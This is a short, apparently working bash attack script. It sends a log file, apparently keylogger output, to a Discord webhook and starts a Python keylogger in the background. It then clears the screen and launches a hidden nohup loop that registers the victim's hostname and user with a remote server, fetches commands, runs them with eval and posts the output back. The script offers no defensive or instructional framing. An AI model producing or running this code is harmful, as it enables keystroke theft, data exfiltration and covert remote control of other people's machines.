#!/bin/bash 
curl -F "filename=@/home/dada/log.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
python3 /home/dada/Keylogger/linux/keylogger.py &
clear
nohup bash -c 's=10.10.10.16:8080&&i=4b1372-7aa9a6-0265ca&&hname=$(hostname)&&p=http://;curl -s "$p$s/4b1372/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/7aa9a6" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/0265ca -X POST -H "Authorization: $i" -d "$r";echo $$;fi; fi; sleep 0.8; done;' & disown
